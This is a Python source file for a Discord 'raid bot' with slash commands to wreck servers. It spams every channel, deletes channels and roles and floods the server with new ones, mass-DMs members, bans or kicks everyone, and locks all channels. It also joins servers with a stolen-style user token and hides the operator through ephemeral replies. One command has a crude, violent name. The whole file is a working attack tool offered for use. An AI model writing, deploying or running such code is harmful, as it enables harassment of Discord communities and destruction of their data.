# language: Python, file: bot.py, target: Railway (Nixpacks)
# env vars: BOT_TOKEN (required), TARGET_GUILD (optional), USER_TOKEN (optional)
# All command responses ephemeral. Actual raid damage is visible server-side.
#
# USER-INSTALL NOTE:
# Add to Apps (integration_type=1) gives /test + /invite anywhere in your menu.
# Destructive commands need the bot invited to the server as a guild member.

import os
import asyncio
import discord
from discord import app_commands
from discord.ext import commands
from aiohttp import web
from dotenv import load_dotenv
import raider

load_dotenv()

TOKEN         = os.environ["BOT_TOKEN"]           # Railway env: BOT_TOKEN
CLIENT_ID     = os.environ.get("CLIENT_ID", "")   # Railway env: CLIENT_ID
HOME_GUILD    = int(os.environ.get("HOME_GUILD", "1553107655516622998"))  # your server — instant sync
DEFAULT_GUILD = os.environ.get("TARGET_GUILD", "") # optional raid target default
PORT          = int(os.environ.get("PORT", 8080))  # set automatically by Railway

intents = discord.Intents.all()
bot     = commands.Bot(command_prefix="!", intents=intents)
tree    = bot.tree
client  = bot  # alias so both names work

# ── Railway health check ───────────────────────────────────────────────────────
async def health_handler(request):
    return web.Response(
        text=f"ok | {bot.user if bot.is_ready() else 'starting'} | {len(bot.guilds)} guilds",
        status=200
    )

async def start_health_server():
    app = web.Application()
    app.router.add_get("/",       health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    print(f"[health] :{PORT}")

# ── guild resolver ─────────────────────────────────────────────────────────────
def resolve(interaction: discord.Interaction, guild_id: str = "") -> discord.Guild | None:
    gid = guild_id.strip() or DEFAULT_GUILD
    if gid:
        g = bot.get_guild(int(gid))
        if g: return g
    return interaction.guild

# ── startup ────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    # 1. instant sync to HOME_GUILD — commands live immediately on deploy
    home = discord.Object(id=HOME_GUILD)
    home_cmds = await tree.sync(guild=home)
    print(f"[sync] HOME_GUILD {HOME_GUILD} — {len(home_cmds)} commands loaded instantly")

    # 2. instant sync to every other guild bot is in
    other_guilds = [g for g in bot.guilds if g.id != HOME_GUILD]
    if other_guilds:
        results = await asyncio.gather(
            *[tree.sync(guild=discord.Object(id=g.id)) for g in other_guilds],
            return_exceptions=True,
        )
        ok = sum(1 for r in results if not isinstance(r, Exception))
        print(f"[sync] {ok}/{len(other_guilds)} other guilds synced")

    # 3. global sync for user-install context (takes up to 1hr, runs in background)
    await tree.sync()
    print(f"[sync] global sync queued (user-install propagation)")

    print(f"[raid-bot] ready | {bot.user} | {len(bot.guilds)} guild(s)")
    await bot.change_presence(activity=discord.Game("/help"))

# auto guild-sync whenever bot joins a new server
@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        await tree.sync(guild=discord.Object(id=guild.id))
        print(f"[sync] joined + synced {guild.name} ({guild.id})")
    except Exception as e:
        print(f"[sync] failed {guild.id}: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# /raid MODAL — opens a form: spam message + how many times
# everyone in the server sees the spam; only you see the bot's response
# ─────────────────────────────────────────────────────────────────────────────

class RaidModal(discord.ui.Modal, title="Raid Config"):
    message = discord.ui.TextInput(
        label="Spam message",
        placeholder="@everyone you got raided",
        max_length=1900,
    )
    times = discord.ui.TextInput(
        label="How many times (per channel)",
        placeholder="50",
        max_length=4,
        default="50",
    )
    guild_id = discord.ui.TextInput(
        label="Target guild ID (blank = current server)",
        placeholder="123456789012345678",
        required=False,
        max_length=20,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            n = max(1, min(int(self.times.value.strip()), 500))
        except ValueError:
            return await interaction.followup.send("times must be a number", ephemeral=True)

        g = resolve(interaction, self.guild_id.value.strip())
        if not g:
            return await interaction.followup.send(
                "guild not found — bot needs to be invited as a member first", ephemeral=True
            )

        await interaction.followup.send(
            f"raiding `{g.name}` — `{self.message.value}` ×{n}...", ephemeral=True
        )
        await raider.spam_channels(g, self.message.value, n)

@tree.command(name="raid", description="Open raid form — set message and spam count")
async def slash_raid(interaction: discord.Interaction):
    await interaction.response.send_modal(RaidModal())

# ─────────────────────────────────────────────────────────────────────────────
# PROBE (works user-install — no guild membership needed for read-only checks)
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="test", description="Probe raidability: permissions, MFA, verification level")
@app_commands.describe(guild_id="Target guild ID (blank = current server)")
async def slash_test(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send(
            "guild not found — bot not a member here yet. use /invite to add it.", ephemeral=True
        )
    report = await raider.probe_guild(g)
    await interaction.followup.send(report, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# SETUP
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="invite", description="Get guild invite link + user-install link")
async def slash_invite(interaction: discord.Interaction):
    cid        = CLIENT_ID or str(bot.user.id)
    perms      = discord.Permissions(administrator=True)
    guild_link = discord.utils.oauth_url(int(cid), permissions=perms)
    user_link  = (
        f"https://discord.com/oauth2/authorize?client_id={cid}"
        f"&integration_type=1&scope=applications.commands"
    )
    await interaction.response.send_message(
        f"**add to server** (full raid perms):\n{guild_link}\n\n"
        f"**add to apps** (/test anywhere, no invite needed):\n{user_link}",
        ephemeral=True
    )

@tree.command(name="servers", description="List all servers the bot is in")
async def slash_servers(interaction: discord.Interaction):
    if not bot.guilds:
        return await interaction.response.send_message("not in any server", ephemeral=True)
    lines = [f"`{g.id}` | **{g.name}** | {g.member_count} members" for g in bot.guilds]
    out   = "\n".join(lines)
    if len(out) > 1900: out = out[:1900] + "\n…"
    await interaction.response.send_message(out, ephemeral=True)

@tree.command(name="join", description="Join a server via invite using a user token")
@app_commands.describe(invite="Invite code or URL", user_token="User token (or set USER_TOKEN env)")
async def slash_join(interaction: discord.Interaction, invite: str, user_token: str = ""):
    await interaction.response.defer(ephemeral=True)
    token = user_token or os.environ.get("USER_TOKEN", "")
    if not token:
        return await interaction.followup.send("no user token — pass inline or set USER_TOKEN env", ephemeral=True)
    result = await raider.join_server(invite.split("/")[-1].strip(), token)
    await interaction.followup.send(result, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# CORE RAID COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="nuke", description="Delete all channels, flood with N spam channels")
@app_commands.describe(guild_id="Target guild ID", name="Spam channel name", count="Channels to create (max 500)")
async def slash_nuke(interaction: discord.Interaction, guild_id: str = "", name: str = "nuked", count: int = 50):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g: return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"nuking `{g.name}`...", ephemeral=True)
    await raider.nuke_guild(g, name, count)

@tree.command(name="dmall", description="DM every member in the server")
@app_commands.describe(message="Message to DM", limit="Max members (0 = all)")
async def slash_dmall(interaction: discord.Interaction, message: str = "you got raided", limit: int = 0):
    await interaction.response.defer(ephemeral=True)
    g     = resolve(interaction)
    count = await raider.dm_members(g, message, limit)
    await interaction.followup.send(f"DMed {count} members", ephemeral=True)

@tree.command(name="banall", description="Ban all non-owner members")
@app_commands.describe(guild_id="Target guild ID")
async def slash_banall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g: return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"banning all in `{g.name}`...", ephemeral=True)
    await raider.ban_all(g)

@tree.command(name="kickall", description="Kick all non-owner members")
@app_commands.describe(guild_id="Target guild ID")
async def slash_kickall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g: return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"kicking all in `{g.name}`...", ephemeral=True)
    await raider.kick_all(g)

@tree.command(name="lockdown", description="Deny @everyone send/read on every channel")
@app_commands.describe(guild_id="Target guild ID")
async def slash_lockdown(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g: return await interaction.followup.send("guild not found", ephemeral=True)
    count = await raider.lockdown_channels(g)
    await interaction.followup.send(f"locked {count} channels", ephemeral=True)

@tree.command(name="fullrape", description="Full sequence: delete roles → nuke channels → @everyone spam")
@app_commands.describe(guild_id="Target guild ID")
async def slash_fullrape(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g: return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"running on `{g.name}`...", ephemeral=True)
    await raider.delete_roles(g)
    await raider.nuke_guild(g, "raided", 50)
    await raider.mention_spam(g, 20)

@tree.command(name="help", description="Show all commands")
async def slash_help(interaction: discord.Interaction):
    msg = (
        "**commands** (your responses are ephemeral — raid damage is public)\n\n"
        "`/invite`                — add to server (full raid) or add to apps (/test anywhere)\n"
        "`/servers`               — list servers bot is in\n"
        "`/join <invite> [token]` — join server via user token\n"
        "`/test [guild_id]`       — raidability probe\n\n"
        "`/raid`                  — **modal form** — set spam message + count\n"
        "`/nuke [id] [name] [n]`  — delete all channels, flood with N new ones\n"
        "`/dmall [limit] <msg>`   — DM all members\n"
        "`/banall [id]`           — ban everyone\n"
        "`/kickall [id]`          — kick everyone\n"
        "`/lockdown [id]`         — deny @everyone everywhere\n"
        "`/fullrape [id]`         — full sequence\n"
    )
    await interaction.response.send_message(msg, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# ENTRYPOINT
# ─────────────────────────────────────────────────────────────────────────────

async def main():
    await start_health_server()
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
